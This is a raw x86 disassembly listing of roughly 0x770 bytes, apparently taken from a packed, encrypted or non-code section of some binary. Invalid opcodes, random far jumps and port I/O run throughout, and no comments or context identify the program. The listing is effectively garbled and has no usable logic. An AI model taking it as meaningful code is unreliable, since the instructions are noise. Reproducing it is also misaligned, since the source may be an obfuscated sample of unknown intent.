  410473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410474:	mov    bh,0x2e
  410476:	lahf   
  410477:	fistp  DWORD PTR [ecx]
  410479:	xor    dh,bl
  41047b:	jae    0x410404
  41047d:	(bad)
  410481:	jae    0x410501
  410483:	out    dx,eax
  410484:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  410486:	in     eax,0x20
  410488:	jnp    0x41041f
  41048a:	mov    eax,0xee317712
  41048f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410491:	push   eax
  410492:	(bad)  
  410493:	jo     0x4104b8
  410495:	adc    cl,BYTE PTR [esi+esi*2-0x6f]
  410499:	adc    DWORD PTR [edi-0x4c],ebp
  41049c:	popf   
  41049d:	xor    al,0x15
  41049f:	push   ecx
  4104a0:	sti    
  4104a1:	xchg   BYTE PTR [edi],al
  4104a3:	dec    ebx
  4104a4:	jge    0x410525
  4104a6:	std    
  4104a7:	jo     0x4104cd
  4104a9:	idiv   DWORD PTR [eax+0x7e]
  4104ac:	add    dh,BYTE PTR [edx+ebp*1-0x7c]
  4104b0:	rol    bl,cl
  4104b2:	push   esp
  4104b3:	or     BYTE PTR [eax-0x1c],bl
  4104b6:	fisttp DWORD PTR [edi+0x44]
  4104b9:	jo     0x410482
  4104bb:	or     ebp,DWORD PTR [ebx]
  4104bd:	cli    
  4104be:	aas    
  4104bf:	add    al,0xa1
  4104c1:	mov    cl,bh
  4104c3:	xor    cl,BYTE PTR [ebx+ebx*1+0x35791cea]
  4104ca:	ret    
  4104cb:	jmp    0x41049e
  4104cd:	inc    ebp
  4104ce:	jmp    0x7d17:0x485387f8
  4104d5:	lahf   
  4104d6:	xor    BYTE PTR [esi-0x5],bh
  4104d9:	int    0x2f
  4104db:	jge    0x41054d
  4104dd:	in     eax,dx
  4104de:	mov    ds:0x314e7d62,al
  4104e3:	mov    ebx,0x5ad8e38b
  4104e8:	dec    edx
  4104e9:	mov    edx,0x258af8eb
  4104ee:	std    
  4104ef:	and    dh,dh
  4104f1:	xchg   esp,eax
  4104f2:	hlt    
  4104f3:	xchg   ecx,eax
  4104f4:	pop    edx
  4104f5:	mov    esp,0x5a989b2d
  4104fa:	mov    eax,ds:0xeabb73f0
  4104ff:	into   
  410500:	mov    bl,0x94
  410502:	add    eax,0x83c2ecd9
  410507:	test   eax,0xed01f6c
  41050c:	je     0x4104fd
  41050e:	push   cs
  41050f:	(bad)  
  410511:	and    al,0x9f
  410513:	and    esp,DWORD PTR [ecx+eiz*2+0x75eb9c29]
  41051a:	je     0x4104b0
  41051c:	aad    0x11
  41051e:	enter  0x28d7,0x16
  410522:	scas   al,BYTE PTR es:[edi]
  410523:	inc    eax
  410524:	push   ecx
  410525:	pop    es
  410526:	sub    eax,0x37d6d02f
  41052b:	or     dl,ch
  41052d:	hlt    
  41052e:	outs   dx,BYTE PTR ds:[esi]
  41052f:	push   ss
  410530:	test   DWORD PTR [ebp-0x49],esp
  410533:	mov    fs,WORD PTR [ecx+0x57707af0]
  410539:	in     al,dx
  41053a:	sub    eax,DWORD PTR ds:0x6ca0dfa2
  410540:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410541:	xlat   BYTE PTR ds:[ebx]
  410542:	leave  
  410543:	lods   al,BYTE PTR ds:[esi]
  410544:	bound  eax,QWORD PTR [edx+0x3a]
  410547:	ffree  st(2)
  410549:	sbb    al,0x2e
  41054b:	fldcw  WORD PTR [edx]
  41054d:	ret    
  41054e:	push   cs
  41054f:	mov    esp,DWORD PTR [ebp-0x67e0f473]
  410555:	out    0xfd,eax
  410557:	stos   DWORD PTR es:[edi],eax
  410558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410559:	push   0x25
  41055b:	out    dx,eax
  41055c:	loope  0x410533
  41055e:	sar    dl,1
  410560:	jecxz  0x4105c5
  410562:	xchg   edx,eax
  410563:	and    ah,BYTE PTR [edi+0x78fc5216]
  410569:	gs hlt 
  41056b:	es push ecx
  41056d:	xor    BYTE PTR [ebp-0x69],ch
  410570:	xor    eax,0x40582fc4
  410575:	or     ecx,DWORD PTR [ebp-0x4c047974]
  41057b:	adc    eax,0xd83e2a3e
  410580:	jmp    0x3e0ede27
  410585:	inc    edx
  410586:	and    dl,BYTE PTR [esi+ebp*4]
  410589:	mov    bl,0xda
  41058b:	pushf  
  41058c:	dec    esi
  41058d:	jnp    0x410583
  41058f:	mov    ds,WORD PTR [edi+0x4d]
  410592:	inc    esp
  410593:	xchg   esi,eax
  410594:	cmovbe edi,DWORD PTR [edi+ecx*1+0x8]
  410599:	push   0x9
  41059b:	dec    edx
  41059c:	mov    cs,WORD PTR [eax-0x63f2d75b]
  4105a2:	pop    ss
  4105a3:	jns    0x410612
  4105a5:	xor    DWORD PTR [esi-0x4a],0x65
  4105a9:	scas   al,BYTE PTR es:[edi]
  4105aa:	clc    
  4105ab:	mov    ss,WORD PTR [edi]
  4105ad:	mov    bl,0xce
  4105af:	scas   eax,DWORD PTR es:[edi]
  4105b0:	sub    eax,0x65f49e9f
  4105b5:	call   0xa094dd8c
  4105ba:	daa    
  4105bb:	gs icebp 
  4105bd:	loope  0x410615
  4105bf:	repnz sbb BYTE PTR [ebx],ah
  4105c2:	xor    bl,BYTE PTR [esi-0x32]
  4105c5:	cmp    eax,esi
  4105c7:	adc    bl,BYTE PTR [ecx-0x68a0ffb]
  4105cd:	pop    edi
  4105ce:	adc    DWORD PTR [edi],ebx
  4105d0:	dec    ebx
  4105d1:	jp     0x4105da
  4105d3:	repz pop ebp
  4105d5:	call   FWORD PTR [edx-0x225bb36d]
  4105db:	cmp    esi,eax
  4105dd:	ror    BYTE PTR [esi+eax*4],cl
  4105e0:	ins    DWORD PTR es:[edi],dx
  4105e1:	mov    bh,0x65
  4105e3:	pop    ebx
  4105e4:	cmp    edx,DWORD PTR [ebx+0x2b8bb5d4]
  4105ea:	mov    ds:0xdc722a4b,al
  4105ef:	xchg   ecx,eax
  4105f0:	inc    eax
  4105f1:	icebp  
  4105f2:	pop    edx
  4105f3:	xchg   edi,eax
  4105f4:	and    DWORD PTR [edi],edx
  4105f6:	cmp    dh,al
  4105f8:	cmp    bh,BYTE PTR [ebx+0xb1b0361]
  4105fe:	xchg   BYTE PTR [edx-0x43],cl
  410601:	clc    
  410602:	scas   eax,DWORD PTR es:[edi]
  410603:	loope  0x4105ef
  410605:	add    DWORD PTR [edx+0x3a],eax
  410608:	jb     0x4105fd
  41060a:	aad    0xcb
  41060c:	mov    esp,DWORD PTR [ecx]
  41060e:	sub    ecx,ecx
  410610:	xchg   ecx,eax
  410611:	sar    DWORD PTR [ebp+0x14012e81],cl
  410617:	pushf  
  410618:	push   eax
  410619:	jecxz  0x410634
  41061b:	ds pop ss
  41061d:	push   ebx
  41061e:	out    0x3b,al
  410620:	test   eax,0x48d7a3b
  410625:	sbb    al,0xdd
  410627:	nop
  410628:	(bad)  
  410629:	or     DWORD PTR [ebp+0x27c67bc5],esi
  41062f:	jmp    0x410614
  410631:	lods   eax,DWORD PTR ds:[esi]
  410632:	mov    bl,0x89
  410634:	in     eax,dx
  410635:	mov    dl,BYTE PTR [ecx+0x7f9361c3]
  41063b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41063c:	sub    al,0xbc
  41063e:	xor    ebp,DWORD PTR [edi-0x2]
  410641:	ins    DWORD PTR es:[edi],dx
  410642:	mov    ss,WORD PTR [esp+ebx*1+0x47f9b006]
  410649:	cs ins BYTE PTR es:[edi],dx
  41064b:	mov    esp,0x4e4249a9
  410650:	xor    eax,ecx
  410652:	jecxz  0x4105f8
  410654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410655:	daa    
  410656:	jns    0x4106c7
  410658:	in     al,0xd3
  41065a:	cld    
  41065b:	iret   
  41065c:	fsubp  st(3),st
  41065e:	aaa    
  41065f:	xchg   DWORD PTR [ecx-0x53],esp
  410662:	and    BYTE PTR [ebx+ecx*1-0xde54a0b],ah
  410669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41066a:	and    BYTE PTR [ecx+ebp*2],ah
  41066d:	retf   
  41066e:	jb     0x410689
  410670:	xor    DWORD PTR [eax+eiz*4+0x29],ebx
  410674:	fist   WORD PTR [ecx]
  410676:	dec    esp
  410677:	jnp    0x410616
  410679:	hlt    
  41067a:	dec    ebp
  41067b:	xchg   esp,eax
  41067c:	mov    eax,ds:0xacd2f35e
  410681:	push   0x41e51742
  410686:	jbe    0x4106f6
  410688:	jge    0x4106d3
  41068a:	je     0x4106d3
  41068c:	cmp    eax,DWORD PTR [esi-0x49]
  41068f:	xor    eax,0xff9e0b21
  410694:	test   al,0xd5
  410696:	jg     0x4106ff
  410698:	push   esp
  410699:	in     al,dx
  41069a:	xor    DWORD PTR [edx-0x74c7ada],edx
  4106a0:	test   BYTE PTR [eax-0x2917d386],bl
  4106a6:	adc    eax,0x8ecbb98c
  4106ab:	outs   dx,DWORD PTR ds:[esi]
  4106ac:	push   esp
  4106ad:	inc    ecx
  4106ae:	in     al,0x2d
  4106b0:	(bad)  
  4106b1:	push   esi
  4106b2:	out    dx,eax
  4106b3:	adc    eax,0x8b19eeee
  4106b8:	and    DWORD PTR [ecx],edx
  4106ba:	aas    
  4106bb:	or     dl,dh
  4106bd:	mov    ebp,0x75b7a1e
  4106c2:	imul   eax,edi,0xc52c475f
  4106c8:	mov    ds:0x51dc1697,eax
  4106cd:	dec    ecx
  4106ce:	mov    ebx,0x5f227b46
  4106d3:	ss dec esi
  4106d5:	push   esi
  4106d6:	daa    
  4106d7:	call   0xeb9f:0x4f73b20b
  4106de:	lea    ebx,[edi]
  4106e0:	bound  ebx,QWORD PTR ds:0xb99e5040
  4106e6:	mov    ecx,0x179b40d0
  4106eb:	jne    0x4106d3
  4106ed:	pop    ebp
  4106ee:	sub    eax,DWORD PTR [edx+0x6e60f79a]
  4106f4:	cmp    DWORD PTR [ecx-0x7ac5b164],edi
  4106fa:	add    esp,DWORD PTR [eax]
  4106fc:	rcl    ch,1
  4106fe:	mov    bl,0xf1
  410700:	inc    esi
  410701:	popa   
  410702:	in     al,dx
  410703:	leave  
  410704:	inc    ecx
  410705:	pop    ecx
  410706:	fist   DWORD PTR [eax+0x3c5f0ef3]
  41070c:	imul   esp,esp,0x54
  41070f:	xchg   esp,eax
  410710:	test   BYTE PTR [bx],dh
  410713:	push   0xabd0c9df
  410718:	xchg   ebp,eax
  410719:	out    dx,eax
  41071a:	mov    edi,0xa28dd394
  41071f:	nop
  410720:	and    DWORD PTR [ecx-0x4c022ec2],esi
  410726:	sbb    al,0x20
  410728:	jae    0x41075b
  41072a:	sub    DWORD PTR [ebp-0x612e4b48],esp
  410730:	cdq    
  410731:	in     eax,0xc4
  410733:	dec    edx
  410734:	fwait
  410735:	test   al,0x5e
  410737:	pop    ebp
  410738:	cs xor eax,0xf91196ad
  41073e:	popa   
  41073f:	fcom   QWORD PTR [ebx+0x75]
  410742:	int    0x1f
  410744:	test   edi,0x32ed34b
  41074a:	fisubr DWORD PTR [edi-0x3076f99b]
  410750:	pop    ebx
  410751:	pushf  
  410752:	mov    ebx,0xae23acb7
  410757:	inc    ebx
  410758:	out    dx,eax
  410759:	push   ds
  41075a:	mov    DWORD PTR [edx*2+0x35c78f9c],0x441213c7
  410765:	(bad)  
  410766:	pop    eax
  410767:	out    dx,al
  410768:	sbb    BYTE PTR [ebp+0x38ac3d2d],ch
  41076e:	mov    dh,0x3b
  410770:	inc    esp
  410771:	sbb    DWORD PTR [ebp+0x274ec741],0x6e
  410778:	push   0xffffffef
  41077a:	dec    esi
  41077b:	inc    esp
  41077c:	mov    ebx,0xd6a9da2f
  410781:	lods   al,BYTE PTR ds:[esi]
  410782:	mov    DWORD PTR [ecx],0xb7e0e0e9
  410788:	jns    0x410763
  41078a:	into   
  41078b:	in     al,0xe7
  41078d:	(bad)  
  41078e:	iret   
  41078f:	pop    eax
  410790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410791:	xor    eax,0x1ba4fa3c
  410796:	dec    ebx
  410797:	sub    DWORD PTR cs:[edi],ecx
  41079a:	pop    edx
  41079b:	ret    
  41079c:	das    
  41079d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41079e:	xor    DWORD PTR [edi-0x4],edx
  4107a1:	mov    bh,0x8a
  4107a3:	ss int3 
  4107a5:	xor    BYTE PTR [esi+0xb],0x83
  4107a9:	jp     0x410828
  4107ab:	jns    0x4107f1
  4107ad:	inc    esi
  4107ae:	mov    dh,0x37
  4107b0:	jae    0x410810
  4107b2:	add    DWORD PTR [edi-0xe813b46],eax
  4107b8:	sahf   
  4107b9:	or     ah,BYTE PTR [ebp+0x1b44c016]
  4107bf:	cwd    
  4107c1:	mov    ch,0x69
  4107c3:	ret    
  4107c4:	pop    ds
  4107c5:	std    
  4107c6:	pop    eax
  4107c7:	iret   
  4107c8:	xor    BYTE PTR [edx-0x7a],cl
  4107cb:	in     al,0x5e
  4107cd:	mov    BYTE PTR [ebx+ebx*4-0x5a0d96c0],ah
  4107d4:	stos   DWORD PTR es:[edi],eax
  4107d5:	dec    ebx
  4107d6:	push   eax
  4107d7:	in     eax,0xed
  4107d9:	xchg   DWORD PTR [ebp-0x29],edi
  4107dc:	mov    esp,fs
  4107de:	out    0xd5,al
  4107e0:	mov    ebp,0x4848a56
  4107e5:	fcomp  DWORD PTR [eax+0x5ead3933]
  4107eb:	dec    edx
  4107ec:	rol    BYTE PTR [ecx+0x76c3537c],0xd5
  4107f3:	pop    ebx
  4107f4:	xchg   edi,eax
  4107f5:	int3   
  4107f6:	push   ds
  4107f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107f8:	pop    ebp
  4107f9:	(bad)  
  4107fa:	push   ebp
  4107fb:	ja     0x41083a
  4107fd:	jge    0x410860
  4107ff:	mov    ds:0xe5d55a66,eax
  410804:	or     ecx,esi
  410806:	fsub   st,st(2)
  410808:	pop    ebp
  410809:	xchg   ebp,eax
  41080a:	fbld   TBYTE PTR [ebx]
  41080c:	xchg   ebp,eax
  41080d:	dec    esp
  41080e:	xchg   ebp,eax
  41080f:	addr16 jp 0x410889
  410812:	and    DWORD PTR [ebp+0xa171efc],esi
  410818:	mov    eax,0xe5dada89
  41081d:	scas   al,BYTE PTR es:[edi]
  41081e:	imul   esi,ecx,0xffffffe4
  410821:	push   ds
  410822:	fadd   QWORD PTR [ecx]
  410824:	in     al,0xa4
  410826:	push   0x3f908e67
  41082b:	mov    al,0x6
  41082d:	pop    esp
  41082e:	popf   
  41082f:	aas    
  410830:	pop    esi
  410831:	mov    ah,0x93
  410833:	loopne 0x4107ee
  410835:	jno    0x41087b
  410837:	retf   
  410838:	lods   eax,DWORD PTR ds:[esi]
  410839:	mov    ebp,0x8b6ba82d
  41083e:	mov    dh,BYTE PTR [ecx]
  410840:	mov    cl,0x4e
  410842:	xlat   BYTE PTR ds:[ebx]
  410843:	mov    BYTE PTR [eax+0x30bbb7de],ah
  410849:	adc    al,0xc5
  41084b:	cmp    al,0x2f
  41084d:	dec    ebx
  41084e:	je     0x41080a
  410850:	pop    ebp
  410851:	cli    
  410852:	inc    ebx
  410853:	sbb    DWORD PTR [ecx-0x43],edi
  410856:	or     BYTE PTR [ecx+0x41],bl
  410859:	aas    
  41085a:	arpl   WORD PTR [eax],si
  41085c:	jge    0x4108ab
  41085e:	xor    DWORD PTR [ecx+eiz*4],edx
  410861:	out    dx,eax
  410862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410863:	cmc    
  410864:	mov    bh,0xce
  410866:	loopne 0x4108b8
  410868:	cmp    BYTE PTR ss:[edi+0x5e],bh
  41086c:	sub    BYTE PTR [esi],dh
  41086e:	loopne 0x410827
  410870:	dec    ebx
  410871:	adc    esp,DWORD PTR [edx]
  410873:	sub    ebx,DWORD PTR [esi-0x19]
  410876:	adc    ecx,0xffffffee
  410879:	fld    TBYTE PTR [edx-0x33]
  41087c:	cmp    cl,BYTE PTR [ebp+0x5e785f7a]
  410882:	fldcw  WORD PTR [ebx]
  410884:	adc    al,0x18
  410886:	int    0xf4
  410888:	sub    eax,0x60290900
  41088d:	leave  
  41088e:	in     eax,0xd5
  410890:	mov    esp,0x16836251
  410895:	mov    edx,0xfd2b67a
  41089a:	nop
  41089b:	sub    DWORD PTR [edi],edi
  41089d:	mov    ah,0x43
  41089f:	adc    BYTE PTR [esi+0x54],bh
  4108a2:	lahf   
  4108a3:	inc    ebp
  4108a4:	scas   al,BYTE PTR es:[edi]
  4108a5:	inc    esi
  4108a6:	and    DWORD PTR [esi],esp
  4108a8:	jl     0x410853
  4108aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ab:	fbstp  TBYTE PTR [esi]
  4108ad:	mov    edx,0x1d9e0f34
  4108b2:	shr    BYTE PTR [ebx-0x6b43f915],0x69
  4108b9:	xor    al,0x13
  4108bb:	push   es
  4108bc:	adc    esi,esi
  4108be:	lods   eax,DWORD PTR ds:[esi]
  4108bf:	mov    bh,0xab
  4108c1:	test   eax,0x1823e34a
  4108c6:	hlt    
  4108c7:	mov    dh,0x49
  4108c9:	mov    ah,0x48
  4108cb:	jnp    0x4108df
  4108cd:	jae    0x41086e
  4108cf:	addr16 into 
  4108d1:	in     al,dx
  4108d2:	xor    esp,DWORD PTR [esi+0x549f1df]
  4108d8:	add    BYTE PTR [edi+0x40],0x4
  4108dc:	pop    ecx
  4108dd:	imul   edi,DWORD PTR [edx],0x6b
  4108e0:	outs   dx,BYTE PTR ds:[esi]
  4108e1:	lods   al,BYTE PTR ds:[esi]
  4108e2:	jnp    0x410914
  4108e4:	mov    edi,0x53ad56dc
  4108e9:	not    ebx
  4108eb:	mov    cl,0xe0
  4108ed:	outs   dx,BYTE PTR ds:[esi]
  4108ee:	loopne 0x410950
  4108f0:	push   esi
  4108f1:	push   eax
  4108f2:	mov    dh,0x18
  4108f4:	icebp  
  4108f5:	lea    eax,[eax+0x25]
  4108f8:	fwait
  4108f9:	add    eax,0x55644e1
  4108fe:	xchg   ecx,eax
  4108ff:	jb     0x4108fd
  410901:	loop   0x4108b5
  410903:	jo     0x4108c4
  410905:	or     DWORD PTR [edi],eax
  410907:	scas   eax,DWORD PTR es:[edi]
  410908:	adc    al,BYTE PTR [ecx]
  41090a:	mov    cl,0x7
  41090c:	mov    edx,0xece8f26b
  410911:	aaa    
  410912:	rcl    BYTE PTR [edx],cl
  410914:	sbb    BYTE PTR [ecx-0x19],al
  410917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410918:	sbb    eax,0x65311c37
  41091d:	loopne 0x4108d4
  41091f:	inc    esi
  410920:	jge    0x410902
  410922:	xor    eax,0x6f3fa2d1
  410927:	xor    DWORD PTR [edx],0xffffffcb
  41092a:	out    0x51,al
  41092c:	or     BYTE PTR ds:0xa8f6ca1f,dh
  410932:	and    eax,0xebdd9cea
  410937:	cmp    ebp,DWORD PTR [edi-0x13]
  41093a:	jno    0x4108e5
  41093c:	mov    dl,0x12
  41093e:	and    BYTE PTR [bp+di-0x2],0x1e
  410943:	jae    0x41091b
  410945:	jbe    0xfc2b30b8
  41094b:	fwait
  41094c:	jo     0x41097f
  41094e:	pusha  
  41094f:	sbb    esi,edi
  410951:	sar    DWORD PTR [esi-0x46545b5d],1
  410957:	pop    edx
  410958:	out    0xd6,al
  41095a:	sub    al,0xcc
  41095c:	jae    0x41099e
  41095e:	xor    BYTE PTR [eax],al
  410960:	cmp    al,0xb5
  410962:	imul   ebp,DWORD PTR [edx-0x7d],0xffffffe5
  410966:	jno    0x4108ed
  410968:	fiadd  DWORD PTR [ecx]
  41096a:	bound  ebx,QWORD PTR [edx]
  41096c:	jbe    0x410973
  41096e:	popf   
  41096f:	and    al,0x76
  410971:	add    eax,0x32de3a1c
  410976:	test   BYTE PTR [edi+0xcb6bd33],dh
  41097c:	into   
  41097d:	or     ebx,DWORD PTR [esp+ecx*2+0x49479eae]
  410984:	pop    esi
  410985:	ins    BYTE PTR es:[edi],dx
  410986:	adc    eax,0xb083db16
  41098b:	dec    esi
  41098c:	mov    edx,0x86ab0055
  410991:	xor    DWORD PTR [esi],ebx
  410993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410994:	xor    DWORD PTR [ecx+0x1b],ecx
  410997:	xlat   BYTE PTR ds:[ebx]
  410998:	jmp    0x1405:0x4234ff95
  41099f:	mov    ebp,0xf2327b63
  4109a4:	lods   eax,DWORD PTR ds:[esi]
  4109a5:	test   esi,esi
  4109a7:	stos   BYTE PTR es:[edi],al
  4109a8:	sub    BYTE PTR [eax-0x5f],ah
  4109ab:	std    
  4109ac:	js     0x410a16
  4109ae:	(bad)  
  4109b0:	les    eax,FWORD PTR [esi-0x55]
  4109b3:	xor    eax,0x1c4fc03b
  4109b8:	mov    edx,0xcfa0d569
  4109bd:	and    bl,ch
  4109bf:	dec    esi
  4109c0:	scas   al,BYTE PTR es:[edi]
  4109c1:	add    al,0xd2
  4109c3:	stc    
  4109c4:	push   ss
  4109c5:	int    0xb7
  4109c7:	sub    DWORD PTR [ecx+edx*1-0x58],ecx
  4109cb:	repz xchg ebp,eax
  4109cd:	ror    DWORD PTR [ecx-0x3e5f5ec0],0x89
  4109d4:	push   eax
  4109d5:	dec    edx
  4109d6:	pop    ds
  4109d7:	fsub   QWORD PTR [eax+0x2b]
  4109da:	into   
  4109db:	jle    0x410a04
  4109dd:	push   0x6ecebfed
  4109e2:	fwait
  4109e3:	in     eax,dx
  4109e4:	or     al,0x88
  4109e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109e7:	mov    ds:0x9a89acb3,al
  4109ec:	jnp    0x41098d
  4109ee:	vaddsd xmm4,xmm7,QWORD PTR [ebp+0x18]
  4109f3:	ret    0xda67
  4109f6:	imul   esp,edx,0x1b15cacf
  4109fc:	and    BYTE PTR [edx+0x6c],ah
  4109ff:	jl     0x410a7b
  410a01:	nop
  410a02:	dec    esp
  410a03:	pop    edi
  410a04:	shr    edx,0xe6
  410a07:	mov    cl,0x6a
  410a09:	pop    ebx
  410a0a:	daa    
  410a0b:	sub    DWORD PTR [edi+esi*2],0xffffffce
  410a0f:	sub    DWORD PTR [edx],ebx
  410a11:	test   edi,esi
  410a13:	fnsave [ebx-0x7d4e0267]
  410a19:	hlt    
  410a1a:	ror    BYTE PTR [ecx],1
  410a1c:	adc    cl,bh
  410a1e:	mov    bh,0xcd
  410a20:	sub    al,0xd7
  410a22:	xor    BYTE PTR [edx-0x74],dl
  410a25:	inc    edx
  410a26:	pop    ebx
  410a27:	inc    edx
  410a28:	inc    ecx
  410a29:	mov    edi,0x90a3655d
  410a2e:	imul   edi,DWORD PTR [eax+0x6],0x55ebd732
  410a35:	shr    BYTE PTR [ebx+eiz*2+0x54fdd1dd],cl
  410a3c:	int3   
  410a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a3e:	and    bh,ch
  410a40:	rcr    BYTE PTR [edx],1
  410a42:	push   0xbb391a4e
  410a47:	inc    ebx
  410a48:	shr    DWORD PTR [esi-0x11e446b1],1
  410a4e:	xchg   esi,eax
  410a4f:	add    ebp,DWORD PTR [ebx+0x322b495]
  410a55:	ins    BYTE PTR es:[edi],dx
  410a56:	aam    0x9e
  410a58:	push   edi
  410a59:	xlat   BYTE PTR ds:[ebx]
  410a5a:	jecxz  0x410a99
  410a5c:	mov    esp,0x6b90cb4a
  410a61:	pop    ebp
  410a62:	dec    ebx
  410a63:	mov    dl,0xa6
  410a65:	push   ebp
  410a66:	inc    esi
  410a67:	mov    BYTE PTR [ebx],al
  410a69:	jp     0x410ae3
  410a6b:	out    dx,al
  410a6c:	xor    al,0x39
  410a6e:	xor    bh,bl
  410a70:	mov    cl,cl
  410a72:	fs out 0xbd,eax
  410a75:	loope  0x410ac2
  410a77:	adc    dh,BYTE PTR [edx+0xc]
  410a7a:	lahf   
  410a7b:	enter  0xc37,0xaf
  410a7f:	icebp  
  410a80:	rcl    DWORD PTR [ecx+0x172c30bb],1
  410a86:	iret   
  410a87:	imul   edx,DWORD PTR [ecx],0x78
  410a8a:	mov    al,ds:0xb21f9a0e
  410a8f:	out    0xb2,eax
  410a91:	sahf   
  410a92:	add    BYTE PTR [edx+0x60],dl
  410a95:	mov    ss,WORD PTR [ecx-0x72]
  410a98:	or     al,0x9f
  410a9a:	pushf  
  410a9b:	and    al,0x1a
  410a9d:	ins    DWORD PTR es:[edi],dx
  410a9e:	mov    bh,0x76
  410aa0:	loop   0x410a2c
  410aa2:	push   ss
  410aa3:	jl     0x410a71
  410aa5:	mov    gs,WORD PTR [ecx]
  410aa7:	push   ecx
  410aa8:	mov    eax,0xbedcdb12
  410aad:	pushf  
  410aae:	sub    DWORD PTR [eax+0x52],ebp
  410ab1:	and    DWORD PTR [ecx-0x17],ecx
  410ab4:	xchg   BYTE PTR [ebp-0x3f],cl
  410ab7:	fstp   QWORD PTR [esi+0x250a9641]
  410abd:	push   esp
  410abe:	pop    ebx
  410abf:	test   edx,0xe9810c12
  410ac5:	shr    BYTE PTR [ebx+0x13],0x87
  410ac9:	lea    edi,[esi-0x3315c589]
  410acf:	loopne 0x410a77
  410ad1:	push   cs
  410ad2:	jns    0x410a8d
  410ad4:	pop    ecx
  410ad5:	jnp    0x410a83
  410ad7:	das    
  410ad8:	iret   
  410ad9:	push   ebx
  410ada:	arpl   WORD PTR [ecx-0x18],cx
  410add:	cs pusha 
  410adf:	push   edi
  410ae0:	or     eax,0x75b4b9c0
  410ae5:	mov    al,0xe9
  410ae7:	fcom   QWORD PTR [esi-0x3199f003]
  410aed:	daa    
  410aee:	add    BYTE PTR [edi-0x3e],ch
  410af1:	dec    ecx
  410af2:	add    ecx,0xffffff90
  410af5:	pop    ds
  410af6:	xchg   ecx,eax
  410af7:	and    ch,BYTE PTR [ecx+0x3bda67f7]
  410afd:	idiv   bl
  410aff:	daa    
  410b00:	mov    WORD PTR [ecx+eiz*1-0x5b],ss
  410b04:	stos   BYTE PTR es:[edi],al
  410b05:	out    dx,eax
  410b06:	xchg   esi,eax
  410b07:	adc    eax,0x59313189
  410b0c:	arpl   di,bp
  410b0e:	push   ebp
  410b0f:	loop   0x410b80
  410b11:	or     dl,BYTE PTR [ebx+0x52bc51dd]
  410b17:	add    BYTE PTR [edi],0x2a
  410b1a:	lahf   
  410b1b:	stc    
  410b1c:	jb     0x410b39
  410b1e:	lea    esi,[edi-0x3752dcd6]
  410b24:	and    DWORD PTR [edi+eax*1+0x3f31015],edi
  410b2b:	cli    
  410b2c:	inc    esp
  410b2d:	inc    edx
  410b2e:	mov    WORD PTR [eax-0x370d1406],es
  410b34:	cmc    
  410b35:	mov    WORD PTR [edi+0x5f002cd4],cs
  410b3b:	mov    ecx,0xe4610ed8
  410b40:	jae    0x410af0
  410b42:	adc    BYTE PTR [ebp+eiz*2+0x66],0xb8
  410b47:	mov    ah,0xcd
  410b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4a:	push   esp
  410b4b:	push   ecx
  410b4c:	shr    DWORD PTR [eax],0xd0
  410b4f:	imul   ecx,DWORD PTR [ecx-0x35ef37a2],0xffffffc9
  410b56:	mov    WORD PTR [edx-0x4e],ds
  410b59:	test   DWORD PTR [edx],esi
  410b5b:	mov    ah,0xd7
  410b5d:	dec    edx
  410b5e:	cmp    al,0x7b
  410b60:	hlt    
  410b61:	loope  0x410b3e
  410b63:	xor    edx,DWORD PTR [edx-0xde3c842]
  410b69:	dec    edi
  410b6a:	and    ebp,0xffffffad
  410b6d:	sbb    bl,cl
  410b6f:	icebp  
  410b70:	sbb    bh,ch
  410b72:	les    ecx,FWORD PTR [ebp+0x46310ed5]
  410b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b79:	sbb    al,0x8c
  410b7b:	ss pop esp
  410b7d:	pop    ebx
  410b7e:	ins    DWORD PTR es:[edi],dx
  410b7f:	xchg   edx,eax
  410b80:	fs cld 
  410b82:	das    
  410b83:	scas   al,BYTE PTR es:[edi]
  410b84:	(bad)  
  410b85:	fld    DWORD PTR [ebx]
  410b87:	(bad)  
  410b88:	and    DWORD PTR [edx+ecx*1-0x74],ebp
  410b8c:	dec    ecx
  410b8d:	add    DWORD PTR [eax],edi
  410b8f:	ret    
  410b90:	pop    ecx
  410b91:	pop    ss
  410b92:	or     bl,al
  410b94:	lock idiv ah
  410b97:	fwait
  410b98:	adc    dh,BYTE PTR [ebx]
  410b9a:	stos   DWORD PTR es:[edi],eax
  410b9b:	or     al,0x27
  410b9d:	sub    dh,cl
  410b9f:	sub    DWORD PTR ds:0x99905bcf,ebp
  410ba5:	lods   al,BYTE PTR ds:[esi]
  410ba6:	rcl    BYTE PTR ds:0xf3bfdc03,cl
  410bac:	fmul   QWORD PTR [esi+0x7d]
  410baf:	arpl   WORD PTR [ebx],bp
  410bb1:	into   
  410bb2:	cwde   
  410bb3:	jmp    0x74621a71
  410bb8:	retf   0x67e9
  410bbb:	mov    ebp,0x4a0192e9
  410bc0:	sbb    eax,0xa1044562
  410bc5:	sbb    edi,ebx
  410bc7:	(bad)  
  410bc8:	and    edi,DWORD PTR [edx+0x53533b92]
  410bce:	aas    
  410bcf:	cwde   
  410bd0:	je     0x410c3c
  410bd2:	popa   
  410bd3:	(bad)  
  410bd4:	div    BYTE PTR [ecx+0x41]
  410bd7:	scas   eax,DWORD PTR es:[edi]
  410bd8:	(bad)  
  410bd9:	nop
  410bda:	push   ebp
  410bdb:	dec    edx
  410bdc:	lods   al,BYTE PTR ds:[esi]
